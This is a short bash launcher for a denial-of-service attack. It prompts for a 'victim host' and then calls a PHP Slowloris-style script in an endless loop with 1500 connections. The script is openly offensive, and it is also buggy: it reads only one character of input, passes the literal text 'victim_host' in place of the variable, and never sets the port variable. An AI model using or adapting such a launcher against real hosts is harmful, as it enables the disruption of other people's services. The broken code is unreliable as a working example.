#!/usr/bin/env bash

  read -n 1 -p "enter victim host:" victim_host

while true
do
    php /code/src/slowlories-script.php random 1500 "victim_host" "$VICTIM_PORT"
done
